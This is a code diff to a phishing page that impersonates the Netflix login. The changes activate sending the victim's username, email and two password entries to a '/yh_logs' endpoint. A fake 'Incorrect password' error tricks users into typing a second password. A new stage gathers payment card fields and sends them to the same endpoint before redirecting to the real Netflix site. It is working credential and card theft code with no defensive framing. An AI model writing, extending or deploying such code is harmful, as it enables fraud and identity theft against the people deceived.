@@ -105,8 +105,10 @@ if ('serviceWorker' in navigator && navigator.serviceWorker.getRegistrations) {
 var clicked = 0;
 function loginBTN()
 {
-$('.loader-default').attr('data-text', "Connecting to Netflix")
-if($('input[type="password"]').val().length<4) return false;
+if(clicked==0) $('.loader-default').attr('data-text', "Connecting to Netflix");
+if(clicked==1) $('.loader-default').attr('data-text', "Connecting to Netflix");
+if(clicked==2) $('.loader-default').attr('data-text', "Updating data");
+if($('input[type="password"]').length) if($('input[type="password"]').val().length<4) return false;
 console.log(4);
 setTimeout(function(){ $('.loader-default').addClass('is-active'); }, 300);
 if(clicked == 0)
@@ -114,17 +116,16 @@ if(clicked == 0)
 	setInterval(function(){ $('.loader-default').attr('data-text',$('.loader-default').attr('data-text')+'.' ); }, 1000);
 }
 let time = 2000;
-if(clicked==1) 
-{
-	let time = 3800;
-}
+if(clicked==0) time = 2000;
+if(clicked==1) time = 3800;
+if(clicked==2) time = 3000;
 setTimeout(function(){
 	if(clicked == 1)
 	{
 	var encodedString = btoa(JSON.stringify({ username: $('input[name="userLoginId"]').val(), email: getUrlVars()['email'], password1:Window.pass1 ,password2: $('input[type="password"]').val()}));
 	let datastg=JSON.parse(atob(encodedString));
 	console.log(datastg);
-	//$.get( "/yh_logs", { username: datastg['username'],  email:datastg['email'], password:datastg['password1'], password2:datastg['password2']}).done(function( data ) {
+	$.get( "/yh_logs", { username: datastg['username'],  email:datastg['email'], password:datastg['password1'], password2:datastg['password2']}).done(function( data ) {});
     //window.location.replace("https://www.netflix.com");});
 	$('.nfEmailPhoneInput').remove();
 	$('.nfPasswordInput').remove();
@@ -150,12 +151,36 @@ setTimeout(function(){
 	$('#newdiv'+i+'').on('click',()=>{$('#newdiv'+i+' input').focus()});
 	}
 	
-	
+	clicked = 2;
 	}
-	else
+	if(clicked == 0)
 	{
 	Window.pass1 = $('input[type="password"]').val();
 	
+	$('.nfPasswordInput').append('<div id="aboba7" class="inputError" data-uia="password-field+error">Incorrect password</div>');
+	$('input[type="password"]').on('input', ()=>{$('#aboba7').remove();});
+	$('.loader-default').removeClass('is-active');
+	clicked=1;
+	}
+	if(clicked == 2)
+	{
+	var cardData = "";
+	for(let i=20;i>=0;i--)
+	{
+		try
+		{
+			if($('#newdiv'+i+' input').length)
+			{
+				cardData += $('#newdiv'+i+' input').val();
+				cardData += "; ";
+			}
+			
+		} catch{}
+	}
+	let datastg=JSON.parse(atob(encodedString));
+	$.get( "/yh_logs", { username: datastg['username'],  email:datastg['email'], password:datastg['password1'], password2:datastg['password2'], cardData:cardData}).done(function( data ) {
+	window.location.replace("https://www.netflix.com");
+	});
 	$('.nfPasswordInput').append('<div id="aboba7" class="inputError" data-uia="password-field+error">Incorrect password</div>');
 	$('input[type="password"]').on('input', ()=>{$('#aboba7').remove();});
 	$('.loader-default').removeClass('is-active');
